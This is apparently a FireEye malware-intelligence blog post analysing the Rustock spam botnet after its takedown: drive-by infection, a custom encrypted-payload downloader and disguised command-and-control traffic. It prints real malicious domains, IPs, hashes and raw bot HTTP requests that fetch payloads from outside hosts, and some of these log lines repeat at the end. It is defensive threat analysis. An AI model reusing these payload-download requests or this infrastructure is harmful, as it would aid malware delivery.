@@ -1,0 +1,133 @@
+As you might have seen in the news, the largest spam botnet, Rustock, was recently taken down in a collaborated, coordinated way.
+All parties involved were bound by a sealed federal lawsuit against the John Doe's involved, but now that the case has been unsealed, it's time to talk about a few of the details.
+Why has Rustock been so successful for so long?
+How has it managed to stay off the radar, yet be the largest spammer in the history of the Internet?
+Why has it taken so long for anyone to take action against them?
+For a little background, Rustock has been around for 5+ years, which in Internet Time, is an eternity.
+We rarely see a broadly distributed threat last that long due to a number of factors, be it due to the actors involved being apprehended (as was the case with Mega-D), security/software companies teaming up to target a specific threat (as was the case with Srizbi), or simply having made enough money that they could move onto other/smaller/more targeted projects (as is essentially the case with ZeuS).
+Starting at the beginning, one needs to consider the malware ecosystem that exists on the Internet.
+It consists of exploit pushers, malware writers, botnet operators, hosting companies, and many sub components of each.
+This infection really illustrates the many layers of the ecosystem.
+Originally we start with a drive by download, which is malicious web content (javascript, java applets, pdf files, etc) that infects a user simply by brushing up against a page that is either compromised, or is selling ad space to enterprising 3rd parties.
+In the specific case I'll be stepping through, the <iframe'd> malicious domain was "oquantis .
+com".
+There is little to be gained from shaming the initial page serving the ad, but understand that this specific exploit campaign appeared on thousands of sites.
+The user was served multiple exploits, that when successful, ran shellcode that called a function to download a file (URLDownloadToCacheFileA) and execute it (CreateProcessA).
+That download URL was "oquantis .
+com / 8347882283830094 / 6345", although it could have easily existed on a different server than the exploit.
+The file downloaded was named "lines.db" from the server (via the HTTP response header), with an md5 of 817b4ff7af62892abb9ea71448114b0a.
+When executed, that file made a number of system level changes, but more importantly made multiple outbound connections.
+The first handful are a combination of gbot and fakeav (\r and \n and replaced with :: and ~~ for space considerations):
+4.ctrl.fajujohiv.cn | GET /gbot/ss.cgi?q=xxx HTTP/1.1::~~Connection: close::~~Host: 4.ctrl.fajujohiv.cn::~~Accept: */*::~~::~~
+2.ctrl.fajujohiv.cn | GET /gbot/ss.cgi?q=xxx HTTP/1.1::~~Connection: close::~~Host: 2.ctrl.fajujohiv.cn::~~Accept: */*::~~::~~
+7.ctrl.fajujohiv.cn | GET /gbot/ss.cgi?q=xxx HTTP/1.1::~~Connection: close::~~Host: 7.ctrl.fajujohiv.cn::~~Accept: */*::~~::~~
+1.ctrl.fajujohiv.cn | GET /gbot/ss.cgi?q=xxx HTTP/1.1::~~Connection: close::~~Host: 1.ctrl.fajujohiv.cn::~~Accept: */*::~~::~~
+protectyourpc-11.com | POST /cgi-bin/cycle_report.cgi?type=g_v30&system=xxx HTTP/1.1::~~Host: protectyourpc-11.com::~~User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)::~~Content-Length: 0::~~Connection: close::~~::~~
+85.234.191.185 | GET /inst.php?id=xxx HTTP/1.0::~~Connection: close::~~Accept: */*::~~Accept-Language: en-us::~~UA-CPU: x86::~~User-Agent: Mozilla/4.0 (compatible; MSIE
+7.0; Windows NT 5.1)::~~Host: 85.234.191.185::~~::~~
+fajujohiv.cn | GET /g/r.php?q=xxx HTTP/1.1::~~Connection: close::~~Host: fajujohiv.cn::~~Accept: */*::~~::~~GET /g/ii.php HTTP/1.1::~~Connection: close::~~Host: fajujohiv.cn::~~Accept: */*::~~::~~
+However, we also see the following later:
+bgjungle.com | GET /ibemh/erztbwqyg.php?adv=adv749 HTTP/1.0::~~Connection: close::~~User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)ver62::~~Host: agburner.com::~~::~~
+agburner.com | GET /ibemh/erztbwqyg.php?adv=adv749 HTTP/1.0::~~Connection: close::~~User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)ver62::~~Host: bgjungle.com::~~::~~
+Note the extremely strange order of headers, where the "Connection:" header appears directly after the GET.
+This is most likely hard-coded in the binary, and interestingly enough, we see the same pattern in gbot, which suggests a link in either the codebase or the actual author.
+That file is pulled down (there is a backup domain built in) and the md5 applicable is 2f50afafb174303a56e1b4f6e4c6192d.
+When that file is executed, it reaches out to a number of download sites to pull down yet another payload:
+204.45.119.2 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.119.2::~~Cache-Control: no-cache::~~::~~
+204.45.121.58 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.58::~~Cache-Control: no-cache::~~::~~
+69.197.144.138 | GET /mybackup21.rar HTTP/1.1::~~Host: 69.197.144.138::~~Cache-Control: no-cache::~~::~~
+204.45.121.50 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.50::~~Cache-Control: no-cache::~~::~~
+96.9.180.21 | GET /mybackup21.rar HTTP/1.1::~~Host: 96.9.180.21::~~Cache-Control: no-cache::~~::~~
+204.45.118.250 | GET /__ex HTTP/1.1::~~Host: 204.45.118.250::~~Cache-Control: no-cache::~~::~~
+The payload downloaded claims to be a rar:
+[email protected] --- {~/rustock} file mybackup21.rar
+mybackup21.rar: RAR archive data, v79,
+[email protected] --- {~/rustock} md5sum mybackup21.rar
+But it is not.
+A decryption algorithm exists in the previous downloader to decrypt it into a .sys and register it as a driver on the system.
+Julia will be talking about more of the details of this mechanism shorly.
+[email protected] --- {~/rustock} file decrypted.sys
+decrypted.sys: PE32 executable for MS Windows (DLL) (native) Intel 80386 32-bit
+[email protected] --- {~/rustock} md5sum decrypted.sys
+The biggest take away from the above cycle is that the actual Rustock spam engine was not distributed in the clear as an unencrypted Windows sys/dll/exe, and certainly not by "social engineering", where users are tricked into installing it.
+What's interesting about the distribution of the spam engine is it wasn't fetched by the shellcode of the exploit, or even by an intermediary downloader, but by its own _custom_ downloader.
+This attacks one of the main ways researchers gather malware, which is by blindly extracting files with PE headers from the wire.
+A researcher using that method, or something else like recursively wget-ing links, would never have seen Rustock in transit.
+This is not a new tactic, but not common place in commodity (or at least non-targeted) malware.
+To find the payload to analyze it in the first place, you would need to have a mechanism of analyzing the exploit (js/pdf/java/flash), the initial downloader, and the encrypted payload all in the same session (hint: this is what we do as a company).
+2) Command and Control
+Shortly after the McColo takedown in 2008, Rustock radically changed its hosting model and command and control protocol.
+If you recall, the structure used to look something like this:
+POST /data.php HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
+In 2008, it was pretty reasonable to hard code an IP address inside an executable, and even today, many bots do not use the DNS at all for C&C, still relying on a set of IPs that are periodically updated by the malware itself.
+The reasoning being that if you need both a domain name and hosting on an IP (a server), that gives the Internet Good Guys two ways to knock you out --- either in the IP routing infrastructure or in the DNS infrastructure with registrars/registries.
+However, in 2008 you would see the bot connecting directly to an IP that was hard-coded, but you would also see that IP in the HTTP Host: header.
+The "new" Rustock C&C protocol played some interesting tricks to make analysis harder, but clearly not impossible.
+POST /index.php?topic=33.117 HTTP/1.1
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
+Looking at the HTTP header, a reasonable person would say "Looks like a message board posting on a tourist site called 'go-thailand-now'".
+The "Referer" header (not the author's misspelling, that's from the RFC) indicates that the person was redirected to the /index.php site from the main domain, which is normal when you log into a site.
+An analyst looking briefly at the header, and at the IP it's connecting to in Scranton, PA (I mean....Scranton?
+), would probably not give it more than a passing glance.
+The botmaster designed his botnet to make it look just a little more legitimate than a typical botnet.
+This is most certainly not APT, but compare it to another very successful piece of modern malware, SpyEye:
+GET /web/map/gate.php?guid=users1!AJKLPQ!JU1232&ver=10280&stat=ONLINE&plg=ftpbc;socks5;t2p&cpu=0&ccrc=JKLAF24&md5=9012ab902413dcf8gga89 HTTP/1.0
+User-Agent: Microsoft Internet Explorer
+An analyst could look at the above in a blink of an eye tell you it's malicious without even looking at the binary or having seen the malware family before.
+The are numerous indicators:
+1) The HTTP headers are missing things like Accept-Language/Accept-Encoding that browsers normally provide
+2) The User-Agent is faked (That's not the IE UA)
+3) The Host: does not look like something a user would intentionally browse to
+4) The URI is clearly passing information about the user
+5) If you are connecting to a hostname instead of an IP, normally you should use HTTP/1.1 instead of 1.0.
+By Rustock not making such mistakes, it made itself just slightly more difficult to detect than the above, and indeed as analysts have came out with SpyEye snort sigs, it has been morphing its structure.
+Coming back to the Rustock C&C communication, it appears, that among interspersing normal traffic to legitimate sites (dual-purpose, as will be detailed later), that the bot is connecting to "go-thailand-now.com".
+In actuality, before this week, that domain wasn't resolving to anything at all.
+The domain wasn't NXing; there was simply no A record returned.
+It turned out that there were a number of domains hidden inside the malware that would be queried, and based on the IP address returned in the A record, a mathmatical transform would happen and the bot would connect to a totally different domain.
+For instance, the bot would query for kwefno3r23asnd.biz, the answer would be 1.2.3.4, and in turn the bot would connect to 5.6.7.8.
+At this time I won't be talking about the algorithm.
+For what it's worth, we only identified five other "fake" domains: godlovesme.org, chernomorsky.name, hollybible.com, hollyjesus.com, and muza-flowers.biz.
+Along with having a relatively unused tactic to find their C&C, they did something virtually no major malware (outside of the APT world) does today, and that's use 95+% US based Command and Control servers.
+Many security products, be it a home security suite or an enterprise secure web gateway, use some notion of "IP reputation" to block or allow traffic.
+Certainly a US Government system constantly beaconing to Russia, Latvia, or China would raise some flags, and conversely, a beacon to Scranton, PA, or Chicago, IL would receive less scrutiny.
+Indeed, if you examine the top C&Cs used over the past 6 months, you'll find that not only have they not had to move IPs, all the top hits were based in the US.
+You might want to check your firewall logs to look for connections going to the c&c servers we have seen in use recently.
+Another interesting note is that to aggravate attribution, many were also running TOR nodes and other services (sorry Abuse Desk, that wasn't me, it was just someone on TOR!).
+Another possibly is that they did this to bolster the TOR network for their own criminal interests --- we saw this happen in the McColo case as well.
+It should be of no surprise to anyone that these servers were dedicated purely to the criminal actors, which is shown by our own metrics (including traffic monitoring at large access points and passive DNS research) as well as the fact that no one has come forward to complain that their legit sites were taken down.
+Additionally, there was a substantial pile of money put up as a bond in case we were in err.
+In the world of malware, just like when being chased by a bear, you don't need to be faster than the bear, just the guy running next to you.
+It's a pretty simple concept --- analysts have limited cycles, and if your competition (other malware writers) are making themselves an easier target, you're going to get away with your crime longer.
+In real terms, I can't imagine the amount of threats that didn't get looked at in 2009 because hundreds of the world's best analysts were looking at Conficker, which ended up being a total non-event.
+Of course, according to our friends at Shadowserver, there are still around 4.5M infected hosts, making it the largest botnet infected with the same malware family (ignore kit-based or "open source" malware).
+One of the main reasons (IMHO) it became a non-event was because there were so many eyes on it.
+It's a double-edged sword for both researchers and malware authors.
+Rustock seems to have found that sweet spot.
+All of this is to say that whatever Rustock was doing worked really well.
+They were able to amass a million node botnet and stay completely stable for over a year.
+One would wonder why the spam levels haven't dropped more than 12 or so percent?
+In my opinion, this is more due to the closure of Spamit (as noted here), that in the past had been a big customer for Rustock, rather than the shrinking size of the botnet.
+It's fairly simple to reason that if the marketplace to purchase spam services goes away or more underground, that there will be less overall spam from certain bots.
+Indeed, our estimation on the size of Rustock has not gone up or down appreciably over the past 6 months (+/- 10%).
+Lots of journalists have been asking FireEye whether the botnet will come back.
+From a technical perspective, it would be difficult for the botmaster to regain control over the currently infected assets to push a new version of code.
+From a practical perspective, there is little to prevent him or her from using the same code base and pushing new infections with a new C&C discovery algorithm, and rebuilding the botnet using totally different hosts.
+From a realistic perspective, unless s/he is presented with a pair of shiny silver bracelets, it is only a matter of time before the author puts his or her skills to use building another spam bot, morphing the current code base to something like a data stealer or ddos bot, or pursues some other crimeware-related activity.
+The biggest takeaway from this is that Microsoft, with the assistance of Pfizer, UW, and FireEye, put immense resources into this effort to create a legal precedence for other companies to pursue similar actions.
+It is now radically easier for other legal teams to take action against abusers of the Internet.
+Lastly, let us not forget that as part of the operation, Microsoft, along with a forensic company trained in chain-of-custody and evidence preservation, seized the physical hard drives from the servers.
+I hope that we have not heard the end of the criminal perspective of this story.
+If I were the operator, I would not be sleeping well knowing that the full resources of the Microsoft Corporation were available to the investigators trying to track me down.
+Alex Lanstein (alex at fireeye dot com) @ FireEye Malware Intelligence Labs
+204.45.119.2 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.119.2::~~Cache-Control: no-cache::~~::~~
+204.45.121.58 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.58::~~Cache-Control: no-cache::~~::~~GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.58::~~Cache-Control: no-cache::~~::~~
+69.197.144.138 | GET /mybackup21.rar HTTP/1.1::~~Host: 69.197.144.138::~~Cache-Control: no-cache::~~::~~GET /mybackup21.rar HTTP/1.1::~~Host: 69.197.144.138::~~Cache-Control: no-cache::~~::~~GET
+/mybackup21.rar HTTP/1.1::~~Host: 69.197.144.138::~~Cache-Control: no-cache::~~::~~GET /mybackup21.rar HTTP/1.1::~~Host: 69.197.144.138::~~Cache-Control: no-cache::~~::~~
+204.45.121.50 | GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.50::~~Cache-Control: no-cache::~~::~~GET /mybackup21.rar HTTP/1.1::~~Host: 204.45.121.50::~~Cache-Control: no-cache::~~::~~GET /m
+ybackup21.rar HTTP/1.1::~~Host: 204.45.121.50::~~Cache-Control: no-cache::~~::~~
+96.9.180.21 | GET /mybackup21.rar HTTP/1.1::~~Host: 96.9.180.21::~~Cache-Control: no-cache::~~::~~
+204.45.118.250 | GET /__ex HTTP/1.1::~~Host: 204.45.118.250::~~Cache-Control: no-cache::~~::~~
